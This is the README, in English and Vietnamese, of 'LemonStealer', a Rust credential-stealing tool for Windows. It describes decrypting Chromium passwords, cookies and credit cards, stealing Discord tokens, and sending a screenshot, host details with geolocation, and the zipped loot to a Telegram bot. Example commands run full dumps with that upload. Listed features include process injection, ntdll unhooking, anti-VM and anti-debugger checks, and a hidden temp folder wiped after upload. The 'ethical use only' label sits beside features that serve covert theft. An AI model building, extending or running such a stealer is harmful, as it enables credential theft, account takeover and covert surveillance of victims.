# 🍋 LemonStealer

[![CI](https://github.com/cecon123/lemon-stealer/actions/workflows/ci.yml/badge.svg)](https://github.com/cecon123/lemon-stealer/actions/workflows/ci.yml)
[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-2024-orange.svg)](https://www.rust-lang.org/)

A Windows, Chromium-only port of [`hack-browser-data`](https://github.com/moonD4rk/HackBrowserData) written in Rust
(edition 2024, workspace `crates/*`). It decrypts and exports Chromium browser data — cookies, passwords, history,
downloads, bookmarks, extensions, credit cards and localStorage/sessionStorage — including **App-Bound Encryption
(v20)** used by Chrome 127+.

```
EN: Below is the primary README. The Vietnamese documentation follows in the same file.
VI: Bên dưới là README chính (tiếng Anh), phần tiếng Việt nằm phía cuối file.
```

> ⚠️ **Ethical use only.** This tool decrypts *local* browser data. Use it **only on machines you own or are
> explicitly authorized to test**. It is a dual-use utility — misuse may violate the law. The author assumes no
> liability for any unlawful use.

---

## Features

- **App-Bound Encryption (v20)**: reflective injection of a payload into a real browser instance (spawned
  suspended with a temp `--user-data-dir`) to borrow the browser's own `IElevator::DecryptData`, so Chrome 151+
  forced-ABE profiles decrypt correctly even when the `Local State` key is a v10 dummy.
- **17 browsers** on Windows: Chrome, Edge, Chromium, Brave, Opera, Opera GX, Vivaldi, Yandex, CocCoc, 360
  Speed, QQ, Sogou, Arc, DuckDuckGo, Firefox, and more — profile scan + per-profile export.
- **Telegram exfil (optional)**: after a dump, send a machine report (OS/CPU/GPU/RAM/disks/HWID/public IP,
  Google-Maps geolocation hyperlink), a full-resolution screenshot, and a `save-{USERNAME}.zip` archive to a
  Telegram bot — `sendPhoto` + `sendDocument` over WinHTTP (no winhttp.dll import-table entry).
- **Discord token scan (optional)**: extracts tokens from desktop Discord clients (LevelDB + DPAPI/GCM) and
  from `discord.com`/`discordapp.com` localStorage rows of dumped browsers.
- **Output**: `csv` / `json` / `cookie-editor` per-profile files, optional `--zip` packaging.
- **Hardened build**: IAT reduction (PEB/export runtime resolution), `ntdll` .text unhook, anti-debugger and
  anti-VM gates, XOR-const string obfuscation for the API-name surface, and parallel per-browser extraction.

## Requirements

- **Rust toolchain** (stable, edition 2024).
- **Windows** target (the project is Windows-only by design).
- The ABE C payload is prebuilt and embedded via `include_bytes!`
  (`crates/abi/payload/abe_extractor_amd64.bin`); see `crates/abi/abe_native/Makefile.frag` to rebuild it.

## Build

```powershell
cargo build --release
.\target\release\lemon.exe --help
```

## Usage

```
lemon [-b <browser>] [-c <categories>] [-f <format>] [-d <dir>] [-p <profile-path>]
      [--zip] [--tg-token <token> --tg-chat <id>] [-v]
```

| Subcommand          | Description                                            | Status        |
|---------------------|--------------------------------------------------------|---------------|
| `dump` (default)    | extract + decrypt + export data                        | ✅            |
| `dumpkeys`          | export master keys JSON (stdout or `-o`)               | ✅            |
| `list`              | list installed browsers & profiles (`--detail` counts) | ✅            |
| `archive`           | pack profile files for cross-host restore              | 🚧 not yet    |
| `restore`           | decrypt copied profile data with exported keys         | 🚧 not yet    |
| `version`           | version, commit, build date                            | ✅            |

### Examples

```powershell
# All browsers, all categories, JSON, packaged into a zip
.\target\release\lemon.exe -b all -c all -f json -d results --zip

# Chrome only, passwords + cookies, CSV, verbose logging
.\target\release\lemon.exe -b chrome -c password,cookie -f csv -v

# Export master keys for offline decryption
.\target\release\lemon.exe dumpkeys -b chrome -o keys.json

# Dump + send screenshot, machine report and zip to Telegram
.\target\release\lemon.exe -b all -c all -d results --tg-token 123456:ABC... --tg-chat 987654321
```

Telegram config can also come from env: `LEMON_TG_TOKEN` / `LEMON_TG_CHAT`. When Telegram is configured and no
`-d` is given, the dump lands in a hidden temp dir that is wiped after the upload (successful or not).

## Architecture

```
core <- crypto <- keyring <- browser <- cli
        abi (bottom; the only crate with unsafe / WinAPI) <- keyring / browser / filemanager / telegram
```

| Crate        | Role                                                               |
|--------------|--------------------------------------------------------------------|
| `core`       | Entry types, `Category`, `BrowserKind`, `BrowserConfig`, `BrowserData`, `Profile` |
| `crypto`     | AES-256-GCM, AES-128-CBC (+ `kEmptyKey`), Yandex intermediate key, PBKDF2 |
| `keyring`    | `MasterKeys {v10, v20}` + retrievers (DPAPI, ABE inject, static)   |
| `browser`    | discovery, profile scan, Chromium/Yandex/Opera extractors, LevelDB, dump |
| `abi`        | all `unsafe`: DPAPI, process spawn/inject, PE parse, IAT patch, unhook, sysinfo, screenshot, WinHTTP |
| `filemanager`| Session/Acquire (copy + WAL/SHM), zip/unzip (zip-slip guard)       |
| `output`     | Writer, formatters `csv`/`json`/`cookie-editor`                     |
| `telegram`   | exfil caption, screenshot, zip upload, geo probe                   |
| `discord`    | Discord token scan (app LevelDB + web localStorage)                 |
| `bypass`     | AV/EDR evasion primitives (string obfuscation, sandbox gate)       |
| `cli`        | clap CLI, logging, timing                                          |

## Testing

```powershell
cargo test --workspace
cargo clippy --workspace --all-targets -- -D warnings
cargo fmt --all -- --check
cargo audit          # if installed
```

## CI / Release

Pushes to `main` (and pull requests) run the CI workflow: build all targets, run tests, clippy `-D warnings`,
fmt check. Tagging a release (`v*.*.*`) builds `lemon.exe` and attaches it to a GitHub Release automatically.
See `.github/workflows/`.

## License

[MIT](LICENSE)

---

# 🇻🇳 Tiếng Việt

## Giới thiệu

Bản port **chỉ dành cho Windows, chỉ Chromium** của [`hack-browser-data`](https://github.com/moonD4rk/HackBrowserData)
(Go → Rust, workspace `crates/*`, edition 2024). Giải mã & xuất dữ liệu trình duyệt Chromium (cookie, mật khẩu,
lịch sử, download, bookmark, extension, credit card, localStorage/sessionStorage) trên Windows — bao gồm cả
**App-Bound Encryption (v20)** của Chrome 127+.

> ⚠️ Chỉ dùng trên máy/máy ảo bạn sở hữu hoặc được phép kiểm tra. Công cụ dual-use — sử dụng sai mục đích có thể
> vi phạm pháp luật.

## Tính năng

- **ABE v20**: inject reflective payload vào browser thật (spawn suspended với temp `--user-data-dir`) để mượn
  `IElevator::DecryptData` của chính browser lấy key — chạy đúng trên **Chrome 151 forced-ABE**.
- **Popup browser đẩy ngoài màn hình** khi inject (`--window-position=-32000,-32000 --window-size=1,1`) — payload
  ổn định, không hiện cửa sổ lên desktop.
- **Telegram exfil (wave 7)**: gửi thông tin máy (OS/CPU/mọi GPU active/RAM/từng ổ cứng fixed/HWID/public IP,
  **location → hyperlink Google Maps**), screenshot **full resolution** (GDI→PNG, **BGR→RGB** hết vàng), và zip
  `save-{USERNAME}.zip` qua `sendPhoto` + `sendDocument` (WinHTTP runtime-resolved, không có import winhttp.dll).
  Khi có `--tg-*` và không truyền `-d`: dump vào **workdir hidden** `%TEMP%` rồi **tự xóa sau khi gửi**.
  Cấu hình bằng `--tg-token` + `--tg-chat` hoặc env `LEMON_TG_TOKEN`/`LEMON_TG_CHAT`.
- **Discord token steal (wave 8)**: steal **cả app lẫn web** — scan LevelDB Local Storage của các client desktop
  (Discord/PTB/Canary/Development) cho token bare + wrapped `dQw4w9WgXcQ:` (AES-GCM v10 qua DPAPI), cộng lọc token
  web từ localStorage các browser đã dump. Đầu ra: `Discord/tokens.json`.
- **Output theo profile**: `results/<browser>/<profile>/<category>.<ext>` với 3 format (`csv`/`json`/`cookie-editor`),
  tùy chọn `--zip`.
- **Build cứng cáp**: IAT reduction (giải mã PEB/export runtime — không có import-table entry cho API thường),
  `ntdll` .text unhook, anti-debugger + anti-VM gate, XOR-const obfuscation bề mặt tên API, extract browsers
  **song song** (giảm tổng thời gian chạy rõ rệt).

## Build

```powershell
cargo build --release
.\target\release\lemon.exe --help
```

Yêu cầu: Rust toolchain. Payload ABE C được build sẵn thành `crates/abi/payload/abe_extractor_amd64.bin`
(từ `crates/abi/abe_native/`, `zig cc` — xem `Makefile.frag`) và embed qua `include_bytes!`.

## Sử dụng

```
lemon [-b <browser>] [-c <categories>] [-f <format>] [-d <dir>] [-p <profile-path>]
      [--zip] [--tg-token <token> --tg-chat <id>] [-v]
```

Subcommand (khớp `hack-browser-data`): `dump` (mặc định), `dumpkeys`, `list`, `version` ✅ —
`archive`, `restore` 🚧 chưa implement.

Ví dụ:

```powershell
# Toàn bộ browser, mọi loại data, JSON, gộp zip
.\target\release\lemon.exe -b all -c all -f json -d results --zip

# Chỉ Chrome, mật khẩu + cookie, CSV, verbose
.\target\release\lemon.exe -b chrome -c password,cookie -f csv -v

# Xuất keys để giải mã trên máy khác
.\target\release\lemon.exe dumpkeys -b chrome -o keys.json

# Dump + gửi screenshot + thông tin máy + zip về Telegram
.\target\release\lemon.exe -b all -c all -d results --tg-token 123456:ABC... --tg-chat 987654321
```

## Kiến trúc

```
core ← crypto ← keyring ← browser ← cli
        abi (cực dưới, mọi unsafe/WinAPI) ← keyring/browser/filemanager/telegram
```

| Crate | Vai trò |
|---|---|
| `core` | `*Entry`, `Category`, `BrowserKind`, `BrowserConfig`, `BrowserData`, `Profile` |
| `crypto` | AES-256-GCM, AES-128-CBC + `kEmptyKey`, Yandex intermediate key, DPAPI wrapper |
| `keyring` | `MasterKeys {v10, v20}` + retrievers: DPAPIRetriever, AbeRetriever (inject), static |
| `browser` | discovery (bảng 17 browser Windows), profile scan, extractor Chromium/Yandex/Opera, LevelDB, dump |
| `abi` | toàn bộ `unsafe`: DPAPI, process spawn/inject, PE parse, IAT patch, unhook, sysinfo, screenshot GDI, WinHTTP + geo probe |
| `filemanager` | Session/Acquire (copy + WAL/SHM, skip LOCK), compress/zip/unzip (zip-slip guard) |
| `output` | Writer per-profile, formatters csv/json/cookie-editor, BOM CSV |
| `telegram` | wave 7: caption HTML+emoji gọn, screenshot full-res + zip qua WinHTTP multipart, geo probe |
| `discord` | wave 8: token steal app + web, viết `Discord/tokens.json` |
| `bypass` | AV/EDR evasion primitives (obfstr, sandbox gate) |
| `cli` | clap CLI, logging backend, timing |

Chi tiết thiết kế, quy tắc port, bảng rủi ro: **[PORTING.md](PORTING.md)** + **[PLAN.md](PLAN.md)**.
Verify thật trên Chrome 151 (forced ABE) + Telegram exfil: **[docs/VERIFY.md](docs/VERIFY.md)**.

## Kiểm thử

```powershell
cargo test --workspace        # toàn bộ test pass
cargo clippy --workspace --all-targets -- -D warnings
cargo fmt --all -- --check
cargo audit                   # nếu đã cài
```

## CI / Release

Push lên `main` (và mọi pull request) chạy CI: build toàn bộ target, chạy test, clippy `-D warnings`, fmt check.
Tag release (`v*.*.*`) sẽ tự build `lemon.exe` và đính kèm vào GitHub Release. Xem `.github/workflows/`.

## License

[MIT](LICENSE)
